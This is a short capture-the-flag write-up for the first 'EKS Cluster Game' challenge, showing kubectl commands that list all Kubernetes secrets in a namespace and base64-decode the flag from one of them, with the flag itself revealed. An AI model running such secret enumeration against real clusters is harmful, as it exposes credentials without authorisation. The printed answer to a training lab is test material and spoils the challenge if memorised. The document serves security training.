---
tags:
  - Kubernetes
  - Secret
title: EKS Cluster Game
description: list all the secrets in the k8s cluster
reference: https://eksclustergames.com/challenge/1
---

## Challenge

Jumpstart your quest by **listing all the secrets in the cluster**. Can you spot the flag among them?

## Solution

### 1. get secret `flag`

```
root@wiz-eks-challenge:~# kubectl get secrets -n challenge1 -o yaml
apiVersion: v1
items:
- apiVersion: v1
  data:
    flag: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==
  kind: Secret
  metadata:
    creationTimestamp: "2023-11-01T13:02:08Z"
    name: log-rotate
    namespace: challenge1
    resourceVersion: "890951"
    uid: 03f6372c-b728-4c5b-ad28-70d5af8d387c
  type: Opaque
kind: List
metadata:
  resourceVersion: ""
```

### 2. decode the `flag`

```
root@wiz-eks-challenge:~# echo d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ== | base64 -d
wiz_eks_challenge{omg_over_privileged_secret_access}
```


